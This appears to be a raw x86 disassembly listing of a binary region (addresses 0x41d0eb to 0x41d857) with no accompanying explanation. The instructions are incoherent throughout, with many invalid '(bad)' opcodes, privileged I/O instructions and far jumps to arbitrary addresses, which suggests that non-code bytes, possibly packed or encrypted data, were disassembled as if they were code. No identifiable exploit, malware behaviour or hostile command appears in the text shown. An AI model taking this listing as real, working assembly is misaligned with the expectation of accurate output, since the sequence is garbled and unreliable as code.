  41d0eb:	lods   eax,DWORD PTR ds:[esi]
  41d0ec:	ficomp WORD PTR fs:[esi+0x699aa98]
  41d0f3:	push   edi
  41d0f4:	cmp    DWORD PTR [ecx],esi
  41d0f6:	into   
  41d0f7:	add    DWORD PTR [ecx],eax
  41d0f9:	loop   0x41d117
  41d0fb:	out    0xef,al
  41d0fd:	mov    ds:0xfc3c83fe,al
  41d102:	lods   eax,DWORD PTR ds:[esi]
  41d103:	add    BYTE PTR [ebx-0x21],dl
  41d106:	pop    es
  41d107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d108:	add    DWORD PTR [ebx-0x719e1439],esi
  41d10e:	jle    0x41d0a7
  41d110:	inc    esp
  41d111:	out    dx,al
  41d112:	pop    ds
  41d113:	or     esi,ecx
  41d115:	jbe    0x41d0c8
  41d117:	push   0x8c85b5e7
  41d11c:	dec    esp
  41d11d:	ret    0xb1cd
  41d120:	adc    al,0xbb
  41d122:	sub    bl,cl
  41d124:	lods   eax,DWORD PTR ds:[esi]
  41d125:	mov    BYTE PTR [edx],bh
  41d127:	pcmpeqw mm6,QWORD PTR [edx+0x7f02edb3]
  41d12e:	fldcw  WORD PTR [edx]
  41d130:	cdq    
  41d131:	jg     0x41d0df
  41d133:	xchg   edx,eax
  41d134:	mov    eax,ds:0xc5665e72
  41d139:	ret    
  41d13a:	stc    
  41d13b:	pop    ss
  41d13c:	inc    ecx
  41d13d:	pop    dx
  41d13f:	(bad)  
  41d140:	call   0x3001:0x559d0018
  41d147:	lea    edi,[eax+edi*8]
  41d14a:	mov    al,ds:0xdf5b4077
  41d14f:	aas    
  41d150:	sbb    BYTE PTR [ecx+0x4bdb5f10],0x64
  41d157:	int    0x6b
  41d159:	or     eax,0x13408466
  41d15e:	push   esi
  41d15f:	(bad)  
  41d160:	sti    
  41d161:	push   eax
  41d162:	mov    ebx,0x57dc48fa
  41d167:	adc    edi,DWORD PTR [eax+0x51]
  41d16a:	add    BYTE PTR [ebp+0x24b093ef],bh
  41d170:	scas   eax,DWORD PTR es:[edi]
  41d171:	(bad)  
  41d172:	lds    ebp,FWORD PTR [edx]
  41d174:	ds xchg edi,eax
  41d176:	jbe    0x41d116
  41d178:	add    DWORD PTR ds:0xd1bfe7d7,edi
  41d17e:	add    cl,BYTE PTR [edi-0x35]
  41d181:	sbb    al,0x55
  41d183:	and    al,BYTE PTR [ebx]
  41d185:	aas    
  41d186:	in     al,0xdf
  41d188:	mov    al,0x77
  41d18a:	jae    0x41d16a
  41d18c:	sub    BYTE PTR [eax],bh
  41d18e:	dec    ecx
  41d18f:	rol    BYTE PTR [edx],1
  41d191:	test   edi,ecx
  41d193:	(bad)  
  41d196:	aaa    
  41d197:	sar    BYTE PTR ds:0xe356ce54,0xb1
  41d19e:	lods   eax,DWORD PTR ds:[esi]
  41d19f:	gs pusha 
  41d1a1:	xor    DWORD PTR [esi],ecx
  41d1a3:	popf   
  41d1a4:	xchg   ecx,eax
  41d1a5:	jmp    0xa834:0x25aa2874
  41d1ac:	cmp    bl,dh
  41d1ae:	ss dec ecx
  41d1b0:	cmc    
  41d1b1:	jns    0x41d159
  41d1b3:	div    bh
  41d1b5:	mov    ah,0xb9
  41d1b7:	outs   dx,DWORD PTR ds:[esi]
  41d1b8:	in     eax,dx
  41d1b9:	int3   
  41d1ba:	repnz cmp ebp,DWORD PTR [edx+eiz*8+0x42]
  41d1bf:	jns    0x41d216
  41d1c1:	pop    es
  41d1c2:	and    al,BYTE PTR [edx]
  41d1c4:	xor    eax,0x596d5f7b
  41d1c9:	das    
  41d1ca:	daa    
  41d1cb:	mov    edi,edi
  41d1cd:	sub    bh,BYTE PTR [ebx-0x5e630b24]
  41d1d3:	mov    ebp,0xa8cb7a9a
  41d1d8:	mov    dl,bl
  41d1da:	and    DWORD PTR [eax],0x27a701c
  41d1e0:	jge    0x41d250
  41d1e2:	popf   
  41d1e3:	int3   
  41d1e4:	retf   0x5a7d
  41d1e7:	jl     0x41d24c
  41d1e9:	sbb    al,0x68
  41d1eb:	call   0x1841e329
  41d1f0:	lea    edx,[ecx+eiz*8-0x6e]
  41d1f4:	(bad)  
  41d1f5:	jmp    0x41d1dd
  41d1f7:	iret   
  41d1f8:	test   DWORD PTR [ecx+0x1213fabd],edi
  41d1fe:	jmp    0x2c27:0xf8b0d5bd
  41d205:	ja     0x41d1d6
  41d207:	or     DWORD PTR ds:0x944a151,ebp
  41d20d:	les    eax,FWORD PTR [ebp+0x1df2b79d]
  41d213:	fwait
  41d214:	cmp    eax,0xbd3b91db
  41d219:	add    BYTE PTR [eax-0x62],ah
  41d21c:	es ret 
  41d21e:	out    dx,eax
  41d21f:	cmp    eax,0xebd9e941
  41d224:	int    0xf4
  41d226:	adc    DWORD PTR [eax+0x6f],0x7a
  41d22a:	popa   
  41d22b:	enter  0x2af9,0x4e
  41d22f:	add    BYTE PTR [esi-0x22],bh
  41d232:	cdq    
  41d233:	jg     0x41d281
  41d235:	scas   al,BYTE PTR es:[edi]
  41d236:	xlat   BYTE PTR ds:[ebx]
  41d237:	cmp    bh,ah
  41d239:	cli    
  41d23a:	or     eax,0x4b4b2381
  41d23f:	data16 jp 0x41d28d
  41d242:	(bad)  
  41d243:	mov    ah,0x6e
  41d245:	mov    edx,0x4b3e1dc2
  41d24a:	xlat   BYTE PTR ds:[ebx]
  41d24b:	nop
  41d24c:	pop    es
  41d24d:	add    dh,BYTE PTR [esi-0x2e095ae7]
  41d253:	xor    DWORD PTR [ecx+ebx*4-0x69],edi
  41d257:	mov    ds:0x7dc6e2cc,al
  41d25c:	mov    ds:0x2d21b20d,al
  41d261:	adc    bl,cl
  41d263:	loope  0x41d255
  41d265:	adc    eax,0x5ecac44b
  41d26a:	stc    
  41d26b:	inc    esp
  41d26c:	add    cl,ch
  41d26e:	mov    ch,0x46
  41d270:	test   eax,0x22326922
  41d275:	jg     0x41d27a
  41d277:	ror    DWORD PTR [edi+0x7b9c045b],1
  41d27d:	fild   QWORD PTR [esi+0x14]
  41d280:	pop    ds
  41d281:	jp     0x41d24e
  41d283:	out    0xee,eax
  41d285:	lds    eax,FWORD PTR ds:0x86a7952d
  41d28b:	cli    
  41d28c:	daa    
  41d28d:	jnp    0x41d2a6
  41d28f:	jge    0x41d2d7
  41d291:	pop    ecx
  41d292:	not    BYTE PTR [eax-0x1d]
  41d295:	pop    esi
  41d296:	jmp    0xbbd4:0x4d741f69
  41d29d:	xor    BYTE PTR [ecx+0x36b898a4],0x2e
  41d2a4:	iret   
  41d2a5:	loope  0x41d303
  41d2a7:	sbb    al,0x88
  41d2a9:	cdq    
  41d2aa:	jo     0x41d30e
  41d2ac:	add    eax,ebx
  41d2ae:	inc    ebp
  41d2af:	retf   
  41d2b0:	arpl   bp,bx
  41d2b2:	sub    ebp,eax
  41d2b4:	add    ah,BYTE PTR [eax-0x60]
  41d2b7:	(bad)  
  41d2b8:	sbb    al,0xf9
  41d2ba:	rcr    DWORD PTR [edi-0x51],cl
  41d2bd:	dec    esi
  41d2be:	and    al,0xeb
  41d2c0:	and    ch,dh
  41d2c2:	and    eax,0xe1e1140a
  41d2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2c9:	add    bl,bh
  41d2cb:	dec    esp
  41d2cc:	test   al,0xed
  41d2ce:	cmp    eax,0xd019123c
  41d2d3:	jns    0x41d28a
  41d2d5:	rol    dh,0x3e
  41d2d8:	pop    edx
  41d2d9:	les    esp,FWORD PTR [ecx-0x69cd010b]
  41d2df:	scas   eax,DWORD PTR es:[edi]
  41d2e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2e1:	mov    bl,0x90
  41d2e3:	int3   
  41d2e4:	cmp    eax,0x62f0ea27
  41d2e9:	div    DWORD PTR [ebx+0x79959883]
  41d2ef:	or     eax,0x77332b57
  41d2f4:	mov    ebp,0xfaffa534
  41d2f9:	dec    ecx
  41d2fa:	int3   
  41d2fb:	ins    DWORD PTR es:[edi],dx
  41d2fc:	bound  esi,QWORD PTR [edi-0x73]
  41d2ff:	pop    esp
  41d300:	xor    al,BYTE PTR [esi]
  41d302:	adc    DWORD PTR [edx+0x581d9085],eax
  41d308:	fbstp  TBYTE PTR [ecx+0x2e9aeea2]
  41d30e:	xchg   edx,eax
  41d30f:	mov    ebx,0x80345d47
  41d314:	fs jnp 0x41d2b3
  41d317:	out    0xe0,al
  41d319:	fist   WORD PTR [esi+0x2975fc9c]
  41d31f:	mov    dh,0xad
  41d321:	iret   
  41d322:	pop    ebx
  41d323:	cmp    DWORD PTR [ebx-0x2769106f],esp
  41d329:	(bad)  
  41d32a:	outs   dx,BYTE PTR ds:[esi]
  41d32b:	xor    DWORD PTR [edx-0x49],ebp
  41d32e:	push   0xffffff91
  41d330:	jmp    0xbd25af7d
  41d335:	clc    
  41d336:	ja     0x41d31e
  41d338:	lahf   
  41d339:	sbb    DWORD PTR [esi+0x45357fb],ebx
  41d33f:	sbb    dl,BYTE PTR ds:0xd7d3f02
  41d345:	inc    edx
  41d346:	ret    0xa039
  41d349:	xchg   ebp,eax
  41d34a:	fwait
  41d34b:	mov    dh,BYTE PTR [ebx]
  41d34d:	fistp  WORD PTR [ecx+0x2e]
  41d350:	ins    DWORD PTR es:[edi],dx
  41d351:	sbb    BYTE PTR [edx],0x1
  41d354:	rol    BYTE PTR [edx+0x58321325],0xfe
  41d35b:	mov    edi,0x9ed3a5dd
  41d360:	rol    DWORD PTR [ecx+0x6bdfb8a1],0x53
  41d367:	push   ss
  41d368:	dec    edx
  41d369:	aam    0xaa
  41d36b:	pop    ebp
  41d36c:	xor    DWORD PTR [ebx],ebp
  41d36e:	jnp    0x41d357
  41d370:	xor    al,0x58
  41d372:	push   ebx
  41d373:	shr    DWORD PTR [ecx],0xd4
  41d376:	sub    al,0x9e
  41d378:	jmp    0x41d3b8
  41d37a:	pop    ebp
  41d37b:	lods   al,BYTE PTR ds:[esi]
  41d37c:	repz cmp al,0x61
  41d37f:	out    dx,eax
  41d380:	lds    edi,FWORD PTR [ebp+ecx*2+0x621d5128]
  41d387:	push   ebx
  41d388:	push   cs
  41d389:	int3   
  41d38a:	sahf   
  41d38b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d38c:	xor    DWORD PTR [ebx],0xe3cf12b5
  41d392:	sti    
  41d393:	or     ebp,eax
  41d395:	xor    ah,ah
  41d397:	fsub   DWORD PTR [ebp+0xb]
  41d39a:	mov    fs,esp
  41d39c:	mov    al,0x95
  41d39e:	repnz mov esp,0x168c25a3
  41d3a4:	ins    BYTE PTR es:[edi],dx
  41d3a5:	lahf   
  41d3a6:	mov    ds:0x75c84056,al
  41d3ab:	es in  eax,0x90
  41d3ae:	mul    BYTE PTR [ebp+ebp*8+0x32]
  41d3b2:	inc    BYTE PTR [ebp+edx*2-0x5c]
  41d3b6:	cmp    eax,0x3a3472a1
  41d3bb:	inc    eax
  41d3bc:	mul    BYTE PTR [ecx+0x2f361b2b]
  41d3c2:	inc    esi
  41d3c3:	dec    ebx
  41d3c4:	push   es
  41d3c5:	mov    ds:0xd20436f6,eax
  41d3ca:	clc    
  41d3cb:	in     eax,0xb1
  41d3cd:	(bad)  
  41d3ce:	sbb    ebp,DWORD PTR [eax+ebp*8+0x31]
  41d3d2:	fs addr16 mov cl,0xc1
  41d3d6:	arpl   WORD PTR [ebx+ecx*2-0x63e77204],sp
  41d3dd:	add    bl,BYTE PTR [edx+0x7c]
  41d3e0:	stos   DWORD PTR es:[edi],eax
  41d3e1:	push   0x7d
  41d3e3:	pop    edi
  41d3e4:	xchg   ebx,eax
  41d3e5:	sbb    eax,0xeb9d553
  41d3ea:	(bad)  
  41d3ec:	in     al,dx
  41d3ed:	repnz mov bh,0xfa
  41d3f0:	mov    ebp,0x55e86bef
  41d3f5:	xchg   edx,eax
  41d3f6:	pop    esp
  41d3f7:	and    al,0x34
  41d3f9:	add    edx,ecx
  41d3fb:	addr16 test al,0x98
  41d3fe:	sahf   
  41d3ff:	cmp    DWORD PTR [ecx+0x58f530d3],edi
  41d405:	aaa    
  41d406:	nop    DWORD PTR [eax+eiz*8-0x2b4319e5]
  41d40e:	jmp    0xfed4092b
  41d413:	or     edi,ebx
  41d415:	jnp    0x41d438
  41d417:	adc    DWORD PTR [edi-0x404a9fa8],esi
  41d41d:	mov    BYTE PTR [ecx-0x443e5556],ch
  41d423:	(bad)  
  41d424:	jp     0x41d3f1
  41d426:	test   eax,0xd5ec6c7c
  41d42b:	aad    0xbf
  41d42d:	push   0x56fdb53a
  41d432:	and    eax,0x878b5435
  41d437:	div    ebx
  41d439:	call   0xa9f8037e
  41d43e:	dec    ebp
  41d43f:	cmp    BYTE PTR [ecx-0x50e00e09],0xd8
  41d446:	cmp    eax,0xe9f4c362
  41d44b:	das    
  41d44c:	inc    ebp
  41d44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d44e:	cdq    
  41d44f:	sbb    bl,al
  41d451:	xorps  xmm5,XMMWORD PTR [ebp+0xe74968f]
  41d458:	jae    0x41d3ed
  41d45a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d45b:	add    eax,0xb6d7f2b8
  41d460:	sti    
  41d461:	mov    edi,0xa31ee267
  41d466:	lock mov al,ds:0xfa639add
  41d46c:	jnp    0x41d4e8
  41d46e:	adc    DWORD PTR [edx-0x6f],ebp
  41d471:	jns    0x41d4bc
  41d473:	pop    es
  41d474:	xchg   ebp,eax
  41d475:	jl     0x41d4a8
  41d477:	mov    ah,0xd3
  41d479:	hlt    
  41d47a:	mov    ebp,DWORD PTR [ecx]
  41d47c:	cmp    ecx,DWORD PTR [eax-0x1a]
  41d47f:	xor    ah,ch
  41d481:	jecxz  0x41d4ee
  41d483:	rcl    BYTE PTR [eax+0x13952a3],1
  41d489:	adc    al,0xa5
  41d48b:	(bad)  
  41d48c:	aam    0x52
  41d48e:	(bad)  
  41d48f:	rol    BYTE PTR [eax-0x5c],1
  41d492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d493:	inc    BYTE PTR [esi+0x1]
  41d496:	sub    eax,0x12bfa6
  41d49b:	mov    WORD PTR [edx+0x78],es
  41d49e:	arpl   WORD PTR [edx],bp
  41d4a0:	lock lods al,BYTE PTR ds:[esi]
  41d4a2:	cdq    
  41d4a3:	outs   dx,DWORD PTR ds:[esi]
  41d4a4:	lock pop edx
  41d4a6:	or     BYTE PTR [ecx-0x7b290c6f],0x42
  41d4ad:	ja     0x41d4fc
  41d4af:	push   es
  41d4b0:	lods   al,BYTE PTR ds:[esi]
  41d4b1:	adc    DWORD PTR [ebx],esi
  41d4b3:	dec    ecx
  41d4b4:	enter  0x5a77,0x14
  41d4b8:	pop    edx
  41d4b9:	out    0x44,eax
  41d4bb:	xchg   edx,eax
  41d4bc:	and    ah,BYTE PTR [edi+0x4fe76946]
  41d4c2:	rcl    esi,0xc4
  41d4c5:	jo     0x41d45c
  41d4c7:	loope  0x41d45f
  41d4c9:	mov    bh,0x55
  41d4cb:	push   ss
  41d4cc:	fldenv [ecx]
  41d4ce:	xchg   esp,eax
  41d4cf:	xchg   edx,eax
  41d4d0:	aad    0x2f
  41d4d2:	(bad)  
  41d4d3:	lods   eax,DWORD PTR ds:[esi]
  41d4d4:	mov    DWORD PTR [eax+ebp*8],0x153ae8df
  41d4db:	mov    bh,0xd7
  41d4dd:	loope  0x41d477
  41d4df:	setne  BYTE PTR [eax+0x3aa0a21f]
  41d4e6:	add    BYTE PTR [edx+0x7a],ah
  41d4e9:	mov    esi,0x7a9e2acc
  41d4ee:	cmp    al,0xd0
  41d4f0:	cld    
  41d4f1:	mov    cl,BYTE PTR [eax+0x52]
  41d4f4:	xor    dl,dh
  41d4f6:	mov    ds:0x726f64ab,eax
  41d4fb:	push   eax
  41d4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4fd:	mov    eax,ds:0xaa6cb783
  41d502:	xchg   ebx,eax
  41d503:	aad    0xb5
  41d505:	mov    dl,0x93
  41d507:	nop
  41d508:	push   ecx
  41d509:	js     0x41d4e9
  41d50b:	loope  0x41d4e5
  41d50d:	das    
  41d50e:	mov    cl,BYTE PTR [esi+0x76d4d104]
  41d514:	push   ebp
  41d515:	xchg   edi,eax
  41d516:	push   ebx
  41d517:	clc    
  41d518:	dec    eax
  41d519:	add    eax,0x8347954c
  41d51e:	pushf  
  41d51f:	sbb    ebp,DWORD PTR [ecx+0x72]
  41d522:	and    BYTE PTR [eax+0x6d391ce7],bl
  41d528:	push   es
  41d529:	frstor [ebp+0x1a]
  41d52c:	inc    ecx
  41d52d:	mov    esi,0xcad6d0d1
  41d532:	sbb    esi,esi
  41d534:	(bad)  
  41d535:	in     eax,0xb6
  41d537:	jns    0x41d507
  41d539:	inc    edi
  41d53a:	cmc    
  41d53b:	adc    eax,0x3d48ba82
  41d540:	jle    0x41d59d
  41d542:	repz lahf 
  41d544:	repnz (bad) 
  41d546:	pop    ecx
  41d547:	push   ss
  41d548:	(bad)  
  41d549:	adc    DWORD PTR [edi-0x4a0baba1],esi
  41d54f:	adc    eax,0xec89b793
  41d554:	test   bh,0xc0
  41d557:	retf   0xcb82
  41d55a:	mov    ebp,0x7a06bfe2
  41d55f:	les    esp,FWORD PTR [eax]
  41d561:	pop    ss
  41d562:	aam    0xb
  41d564:	cmc    
  41d565:	sbb    eax,0xbf334d5d
  41d56a:	inc    edi
  41d56b:	mov    dh,0xf9
  41d56d:	jno    0x41d4ff
  41d56f:	xchg   ecx,eax
  41d570:	nop
  41d571:	adc    BYTE PTR [eax+edx*2],bl
  41d574:	or     ecx,edi
  41d576:	mov    ds,eax
  41d578:	push   ss
  41d579:	lahf   
  41d57a:	popf   
  41d57b:	cwde   
  41d57c:	in     eax,dx
  41d57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d57e:	test   ecx,0x5e08e964
  41d584:	mov    ecx,DWORD PTR [eax+0x475c06e3]
  41d58a:	cmp    BYTE PTR ds:0x456dc4c0,al
  41d590:	pop    ebp
  41d591:	fwait
  41d592:	je     0x41d5b7
  41d594:	dec    edi
  41d595:	sbb    eax,0xedf03fb
  41d59a:	fldcw  WORD PTR [esi+0x79]
  41d59d:	mov    ah,0x6b
  41d59f:	add    dh,BYTE PTR [edi-0x5e44a056]
  41d5a5:	pop    ss
  41d5a6:	aam    0x77
  41d5a8:	mov    eax,0x485af1da
  41d5ad:	xchg   esp,eax
  41d5ae:	sbb    eax,0x6bdeaeac
  41d5b3:	ins    DWORD PTR es:[edi],dx
  41d5b4:	daa    
  41d5b5:	dec    eax
  41d5b6:	dec    edx
  41d5b7:	je     0x41d601
  41d5b9:	jmp    0x78afcf56
  41d5be:	test   ah,ch
  41d5c0:	push   0xb594e3db
  41d5c5:	inc    ebx
  41d5c6:	shl    DWORD PTR [ebp+0x74],0xbd
  41d5ca:	add    eax,0x4ee9d8b8
  41d5cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d0:	push   ebp
  41d5d1:	and    al,0x23
  41d5d3:	in     eax,0xf2
  41d5d5:	(bad)  
  41d5d6:	mov    ah,BYTE PTR [ebx]
  41d5d8:	fs aaa 
  41d5da:	(bad)  
  41d5db:	jmp    DWORD PTR [edi-0x45]
  41d5de:	rcr    DWORD PTR [ebx-0x2de94dc1],1
  41d5e4:	mov    DWORD PTR [ecx-0x720d2622],esp
  41d5ea:	jb     0x41d604
  41d5ec:	in     al,0x94
  41d5ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5ef:	scas   al,BYTE PTR es:[edi]
  41d5f0:	clc    
  41d5f1:	in     eax,dx
  41d5f2:	sti    
  41d5f3:	test   esp,ebp
  41d5f5:	mov    ds:0xc11c4078,eax
  41d5fa:	fwait
  41d5fb:	in     eax,dx
  41d5fc:	dec    ecx
  41d5fd:	rcl    DWORD PTR [ebx+0x6c],cl
  41d600:	leave  
  41d601:	cld    
  41d602:	enter  0x8d13,0x18
  41d606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d607:	cld    
  41d608:	push   eax
  41d609:	xchg   BYTE PTR [edi-0x76],bh
  41d60c:	adc    al,0xde
  41d60e:	retf   
  41d60f:	(bad)  
  41d610:	sar    bh,1
  41d612:	push   ebp
  41d613:	stc    
  41d614:	cmp    ebx,DWORD PTR [esi+0x6db8be9]
  41d61a:	and    al,0x40
  41d61c:	push   edx
  41d61d:	fs sbb al,0x52
  41d620:	jmp    FWORD PTR [ebp-0x54d09f5]
  41d626:	popf   
  41d627:	arpl   bp,dx
  41d629:	ja     0x41d5ff
  41d62b:	mov    al,0x2
  41d62d:	fdivrp st(4),st
  41d62f:	idiv   DWORD PTR [esi]
  41d631:	xor    al,BYTE PTR [edi+eax*1+0x30]
  41d635:	lds    ecx,FWORD PTR [esi]
  41d637:	ins    DWORD PTR es:[edi],dx
  41d638:	imul   eax,ebp,0x1dc7a5a7
  41d63e:	fstp   DWORD PTR [eax+0x64]
  41d641:	add    bl,BYTE PTR [edi*2-0x699f8e1b]
  41d648:	fdivr  DWORD PTR ds:0xce150d08
  41d64e:	popa   
  41d64f:	rcr    ch,cl
  41d651:	push   ds
  41d652:	adc    ch,dh
  41d654:	jmp    FWORD PTR [edx+0x7f8b3349]
  41d65a:	sub    eax,0x1a844a2
  41d65f:	scas   eax,DWORD PTR es:[edi]
  41d660:	std    
  41d661:	sbb    al,0x40
  41d663:	push   esi
  41d664:	enter  0xd852,0x45
  41d668:	loop   0x41d60f
  41d66a:	nop
  41d66b:	ds jge 0x41d66b
  41d66e:	(bad)  
  41d66f:	add    BYTE PTR [esi],al
  41d671:	mov    al,0x76
  41d673:	xor    eax,0x25e898a5
  41d678:	and    al,0x70
  41d67a:	and    edi,DWORD PTR [eax-0x62888d48]
  41d680:	push   ds
  41d681:	daa    
  41d682:	pop    edi
  41d683:	retf   
  41d684:	cmp    dl,al
  41d686:	arpl   WORD PTR [esi+0x23],cx
  41d689:	neg    DWORD PTR [ebx]
  41d68b:	mov    dl,0x8f
  41d68d:	jmp    0x41d6fb
  41d68f:	xor    eax,DWORD PTR [edx-0xf7a8e20]
  41d695:	sbb    esp,eax
  41d697:	push   ebx
  41d698:	mov    ds:0xaac462ec,al
  41d69d:	add    al,0x5e
  41d69f:	clc    
  41d6a0:	scas   eax,DWORD PTR es:[edi]
  41d6a1:	rcr    ecx,1
  41d6a3:	call   0x27ad31c2
  41d6a8:	aaa    
  41d6a9:	aad    0x6c
  41d6ab:	clc    
  41d6ac:	mov    esp,0xd26f5fc1
  41d6b1:	stos   BYTE PTR es:[edi],al
  41d6b2:	push   ss
  41d6b3:	test   BYTE PTR [eax],bl
  41d6b5:	int    0x3e
  41d6b7:	cmp    BYTE PTR [esi+0x6],al
  41d6ba:	cmp    BYTE PTR [ebx],ch
  41d6bc:	mov    dh,0x85
  41d6be:	retf   0x1bb0
  41d6c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6c2:	ja     0x41d6e5
  41d6c4:	call   0xa686d4d1
  41d6c9:	cmc    
  41d6ca:	jg     0x41d67d
  41d6cc:	push   0xb30cc979
  41d6d1:	or     ecx,DWORD PTR [edi-0xa]
  41d6d4:	loopne 0x41d74c
  41d6d6:	retf   0x920b
  41d6d9:	call   0x7572:0x349d3bc5
  41d6e0:	mov    gs,WORD PTR [esi]
  41d6e2:	push   ebp
  41d6e3:	ror    DWORD PTR [ecx],1
  41d6e5:	inc    esi
  41d6e6:	push   ebp
  41d6e7:	ret    0x5fea
  41d6ea:	outs   dx,BYTE PTR ds:[esi]
  41d6eb:	push   edx
  41d6ec:	repnz ins BYTE PTR es:[edi],dx
  41d6ee:	mov    BYTE PTR [ebx-0x1c],ah
  41d6f1:	cmp    eax,0x4e0105f5
  41d6f6:	in     al,dx
  41d6f7:	xchg   ebp,eax
  41d6f8:	sbb    eax,0x456e3748
  41d6fd:	rcr    BYTE PTR [esi],cl
  41d6ff:	mov    cl,0x15
  41d701:	mov    WORD PTR [ebp-0x2d82e8a],fs
  41d707:	xor    ch,ch
  41d709:	jmp    0x81c:0x8020948d
  41d710:	repz xor ebx,esi
  41d713:	pop    ecx
  41d714:	xor    DWORD PTR [ebx],esi
  41d716:	aaa    
  41d717:	dec    ebp
  41d718:	(bad)  
  41d719:	dec    esp
  41d71a:	(bad)  
  41d71b:	mov    dh,0x82
  41d71d:	mov    DWORD PTR [di-0x54],edx
  41d721:	mov    bh,0x4
  41d723:	sahf   
  41d724:	ins    DWORD PTR es:[edi],dx
  41d725:	pop    esp
  41d726:	pop    es
  41d727:	dec    edx
  41d728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d729:	stos   BYTE PTR es:[edi],al
  41d72a:	pop    ss
  41d72b:	inc    ebp
  41d72c:	adc    al,BYTE PTR [ebx-0x72]
  41d72f:	stos   DWORD PTR es:[edi],eax
  41d730:	fsubr  DWORD PTR [ebp-0x77]
  41d733:	add    DWORD PTR [eax-0x4e],edi
  41d736:	dec    ebx
  41d737:	fild   QWORD PTR [ebx-0x1084e6d3]
  41d73d:	adc    DWORD PTR [ecx+edx*2+0x1794a9d1],esp
  41d744:	jae    0x41d793
  41d746:	mov    edi,0xf3d51acf
  41d74b:	dec    edx
  41d74c:	loop   0x41d730
  41d74e:	jbe    0x41d775
  41d750:	mov    esp,0xd30335c6
  41d755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d756:	push   0x676f3a30
  41d75b:	call   0xb9938ca8
  41d760:	outs   dx,BYTE PTR ds:[esi]
  41d761:	and    eax,0xafd6cb1a
  41d766:	mov    bl,0x3e
  41d768:	mov    bh,0xc4
  41d76a:	xlat   BYTE PTR ds:[ebx]
  41d76b:	int    0x1c
  41d76d:	or     al,0x64
  41d76f:	inc    ecx
  41d770:	mov    ecx,0x1dad7d54
  41d775:	adc    ecx,DWORD PTR [ebx+0x8cb22d8]
  41d77b:	(bad)  
  41d77c:	and    eax,0xd45df0c3
  41d781:	push   es
  41d782:	push   esi
  41d783:	jns    0x41d73e
  41d785:	js     0x41d75f
  41d787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d788:	stos   DWORD PTR es:[edi],eax
  41d789:	cs into 
  41d78b:	mov    BYTE PTR [ecx+0x8a112a0],cl
  41d791:	xor    dh,cl
  41d793:	fisub  WORD PTR [edi+0x31]
  41d796:	xchg   edi,eax
  41d797:	test   DWORD PTR [eax-0x1daa0733],ebp
  41d79d:	add    dl,ah
  41d79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7a0:	inc    esi
  41d7a1:	mov    WORD PTR [ebp-0x1f76745],ss
  41d7a7:	loopne 0x41d7d3
  41d7a9:	int    0xf2
  41d7ab:	mov    eax,ds:0xacac4717
  41d7b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7b1:	rol    DWORD PTR [edx],0x6a
  41d7b4:	xor    DWORD PTR [edx],ecx
  41d7b6:	out    dx,eax
  41d7b7:	enter  0x51e2,0x16
  41d7bb:	and    esp,DWORD PTR [esi+0x18]
  41d7be:	test   DWORD PTR [ecx],0x56129251
  41d7c4:	aam    0xdf
  41d7c6:	jl     0x41d7c8
  41d7c8:	xchg   edx,eax
  41d7c9:	pop    ecx
  41d7ca:	jne    0x41d7cf
  41d7cc:	loopne 0x41d7be
  41d7ce:	xchg   BYTE PTR [edx+0x5d7d2f1b],dh
  41d7d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7d5:	jl     0x41d790
  41d7d7:	jb     0x41d7ac
  41d7d9:	xchg   edx,eax
  41d7da:	adc    BYTE PTR [ebx+0x7e3ac03e],dl
  41d7e0:	call   0x5222:0x2cf24b2
  41d7e7:	or     esp,ebp
  41d7e9:	jecxz  0x41d7f2
  41d7eb:	push   eax
  41d7ec:	(bad)  
  41d7ed:	outs   dx,BYTE PTR ds:[esi]
  41d7ee:	cmc    
  41d7ef:	call   0x9563d8b9
  41d7f4:	or     al,0x2d
  41d7f6:	adc    al,0x69
  41d7f8:	out    dx,al
  41d7f9:	fwait
  41d7fa:	xchg   ebx,eax
  41d7fb:	cmp    al,0x46
  41d7fd:	sbb    ecx,0x1d
  41d800:	mov    al,0xe5
  41d802:	mov    WORD PTR [edx+0x5a3533be],gs
  41d808:	jp     0x41d81d
  41d80a:	ret    0x1b9a
  41d80d:	xchg   ebx,eax
  41d80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d80f:	xchg   edx,eax
  41d810:	inc    edx
  41d811:	inc    ecx
  41d812:	inc    edx
  41d813:	mov    bl,0x18
  41d815:	cld    
  41d816:	add    ah,BYTE PTR [edx]
  41d818:	add    eax,0x7f89cb7a
  41d81d:	stc    
  41d81e:	mov    es,WORD PTR [edx-0x5d6633dd]
  41d824:	stc    
  41d825:	ins    BYTE PTR es:[edi],dx
  41d826:	mov    ebx,0xe1ba9076
  41d82b:	loopne 0x41d829
  41d82d:	fisubr WORD PTR ds:0x1a8b67b1
  41d833:	mov    ah,0xe
  41d835:	clc    
  41d836:	repz fld QWORD PTR [eax]
  41d839:	adc    eax,0x35ba7802
  41d83e:	dec    edi
  41d83f:	lock and eax,0xea341457
  41d845:	pop    eax
  41d846:	inc    ecx
  41d847:	mov    ah,0x6f
  41d849:	out    dx,al
  41d84a:	sbb    BYTE PTR [esi],cl
  41d84c:	add    al,0x4c
  41d84e:	jl     0x41d81c
  41d850:	cmp    BYTE PTR [eax+eiz*8-0x7e74a1c9],bh
  41d857:	shr    DWORD PTR [ebx],0x7f
